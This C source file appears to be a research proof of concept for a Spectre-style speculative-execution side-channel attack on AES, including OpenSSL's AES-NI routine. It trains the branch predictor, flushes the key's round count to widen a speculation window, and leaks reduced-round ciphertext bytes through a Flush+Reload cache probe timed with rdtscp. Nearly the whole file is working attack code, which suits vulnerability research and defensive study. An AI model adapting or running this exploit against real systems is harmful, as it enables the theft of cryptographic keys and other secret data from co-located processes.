#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <x86intrin.h>

#include "aes.h"

// The algorithm to test. Allowed values are as followed
//  looped   - Our C implementation, with a loop
//  unrolled - Our C implementation, unrolled
//  openssl  - OpenSSL V3.0.0's implementation, with a loop
#define ALGORITHM looped

// The size of the victim key. Allowed values are 128, 192, 256
const size_t KEY_SIZE = 256;

// Number of rounds to speculatively execute.
//  This can be any number of rounds between one and fourteen.
//  For 10, 12, 14. The behavior of all implementations are identical.
//  For other values the behavior may differ depending on the implementation.
const size_t SPECULATED_ROUND_COUNT = 10;

const size_t TRAINING = 128;        // Number of rounds to train bpu
const size_t THRESHOLD = 100;       // Time in cycles to distinguish cache hit from miss
const size_t SAMPLE_COUNT = 100;    // Number of samples (repeats of the entire attack) per ciphertext byte to leak

// Support for OpenSSL
uint32_t OPENSSL_ia32cap_P[4] = { 0 };
#define openssl aesni_encrypt

// AES implementations
extern void aesni_encrypt(const unsigned char *in, unsigned char *out, const AES_KEY *key);
extern void looped(uint8_t *plaintext, uint8_t *ciphertext, AES_KEY *key);
extern void unrolled(uint8_t *plaintext, uint8_t *ciphertext, AES_KEY *key);
extern void looped_fact(uint8_t *plaintext, uint8_t *ciphertext, AES_KEY *key);
extern void unrolled_fact(uint8_t *plaintext, uint8_t *ciphertext, AES_KEY *key);

// Helper functions defined below
void tobinary(char *data, uint8_t *aes, size_t size);
uint64_t time_access(volatile uint8_t *ptr, size_t index);
void flush(volatile void *ptr, size_t length);
void open_speculation_window();
void print(char *name, uint8_t *output);

// constant time selector.
#define CT_SELECT(condition, true, false) ((condition & true) | (~condition & false))

int main(int ac, char **av)
{
    uint8_t input[16];
    uint8_t output[16];
    uint8_t key[32];

    uint8_t output_fr[16]; // Full round ciphertext
    uint8_t output_sr[16]; // Speculated round ciphertext
    uint8_t output_tk[16]; // Training key ciphertext

    uint8_t output_fr_fact[16]; // Full round ciphertext
    uint8_t output_sr_fact[16]; // Speculated round ciphertext
    uint8_t output_tk_fact[16]; // Training key ciphertext

    volatile uintptr_t base = (uintptr_t)mmap(
        NULL,
        100 * 1024 * 1024,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_SHARED | MAP_ANONYMOUS,
        0,
        0
    );
    memset((void *)base, 0, 100 * 1024 * 1024);
    base = ((base / 4096) * 4096) + 4096;

    // Lay out everything by hand to ensure we have desired alignment
    AES_KEY* aeskeyT         = (AES_KEY*)(base + 4096 * 1 + 16); // + 16 to align rounds to a cacheline so it can be flushed
    AES_KEY* aeskeyV         = (AES_KEY*)(base + 4096 * 2 + 16);
    volatile uint8_t *probeT = (uint8_t*)(base + 4096 * 3);
    volatile uint8_t *probeV = (uint8_t*)(base + 4096 * (3 + 257));
    volatile size_t probe_length = 4096 * 256;

    // Test vectors: https://csrc.nist.gov/CSRC/media/Projects/Cryptographic-Algorithm-Validation-Program/documents/aes/AESAVS.pdf
    //  Expected output: 46f2fb342d6f0ab477476fc501242c5f
    tobinary("c47b0294dbbbee0fec4757f22ffeee3587ca4730c3d33b691df38bab076bc558", key, 32);
    AES_set_encrypt_key(key, KEY_SIZE, aeskeyV);

    //  Expected output: 4bf3b0a69aeb6657794f2901b1440ad4
    tobinary("28d46cffa158533194214a91e712fc2b45b518076675affd910edeca5f41ac64", key, 32);
    AES_set_encrypt_key(key, 256, aeskeyT);

    // Plaintext
    tobinary("00000000000000000000000000000000", input, 16);

    // Print ciphertext for reduced rounds and using the training key
    unrolled(input, output_fr, aeskeyV);
    unrolled_fact(input, output_fr_fact, aeskeyV);
    aeskeyT->rounds = SPECULATED_ROUND_COUNT;
    unrolled(input, output_tk, aeskeyT);
    unrolled_fact(input, output_tk_fact, aeskeyT);
    int old = aeskeyV->rounds;
    aeskeyV->rounds = SPECULATED_ROUND_COUNT;
    unrolled(input, output_sr, aeskeyV);
    unrolled_fact(input, output_sr_fact, aeskeyV);
    aeskeyV->rounds = old;
    print("FULL ROUNDS     ", output_fr);
    print("FULL ROUNDS_FACT", output_fr_fact);
    print(" SPECULATED     ", output_sr);
    print(" SPECULATED_FACT", output_sr_fact);
    print("   TRAINING     ", output_tk);
    print("   TRAINING_FACT", output_tk_fact);
    printf("\n");

    // Index of the output to leak
    for (size_t index = 0; index < 16; index++) {
        size_t hits[256] = {};

        // Repeat the attack since it can fail.
        for (size_t sample = 0; sample < SAMPLE_COUNT; sample++)
        {
            // Reset cache state
            flush(probeV, probe_length);

            for (int i = 0; i < TRAINING + 1; i++)
            {
                int mask = (i - TRAINING) >> 31;

                uint8_t* probe = (uint8_t*)CT_SELECT(mask, (uintptr_t)probeT, (uintptr_t)probeV);
                AES_KEY* key   = (AES_KEY*)CT_SELECT(mask, (uintptr_t)aeskeyT, (uintptr_t)aeskeyV);

                // Flush rounds from the cache to ensure that the
                //  speculation window is large enough to run the
                //  remaining AES rounds and to leak into cache
                flush(&aeskeyV->rounds, 64);

                // Serialise instructions and open speculation window
                // These aren't strictly necessary to achieve the attack.
                _mm_mfence();
                open_speculation_window();

                // Run victim function
                ALGORITHM(input, output, key);

                // sidechannel_send - Leak into the cache
                probe[output[index] * 4096]++;
            }

            // sidechannel_recv - Read cache state
            for (int i = 0; i < 256; i++)
            {
                if (time_access(probeV, i * 4096) < THRESHOLD)
                {
                    hits[i]++;
                }
            }
        }

        // Print data read from side channel
        for (size_t i = 0; i < 256; i++)
        {
            // Filter out data from the full round & training key
            //  that may have made its way through our channel.
            // We assume the attacker knows these values anyway
            //  and can therefore do this filtering.
            if (hits[i] > 0 && i != output_fr[index] && i != output_tk[index])
            {
                printf("INDEX: %2ld | BYTE: %02lx | HITS: %ld\n", index, i, hits[i]);
            }
        }
    }
}

void tobinary(char *data, uint8_t *aes, size_t size)
{
    assert(strlen(data)==size*2);
    unsigned int x;
    for (int i = 0; i < size; i++)
    {
        sscanf(data + i * 2, "%2x", &x);
        aes[i] = x;
    }
}

uint64_t time_access(volatile uint8_t *ptr, size_t index)
{
    uint32_t junk;
    uint64_t start = __rdtscp(&junk);
    ptr[index]++;
    uint64_t end = __rdtscp(&junk);
    return end - start;
}

void flush(volatile void *ptr, size_t length)
{
    uint8_t *byte_ptr = (uint8_t *)ptr;

    // Align to cache line
    length += (uintptr_t)byte_ptr & 0x3F;
    byte_ptr = (uint8_t *)((uintptr_t)byte_ptr & ~0x3F);

    // Flush every cacheline
    for (size_t i = 0; i < length; i += 64)
    {
        _mm_clflush(byte_ptr + i);
    }
}

volatile uint32_t spin_junk = 0;
void open_speculation_window()
{
    for (size_t i = 0; i < 200; i++)
    {
        spin_junk = ((spin_junk + 1) * spin_junk) / (spin_junk - 1);
    }
}

void print(char *name, uint8_t *output)
{
    printf("%s: ", name);
    for (size_t i = 0; i < 16; i++)
    {
        printf("%02x ", output[i]);
    }
    printf("\n");
}
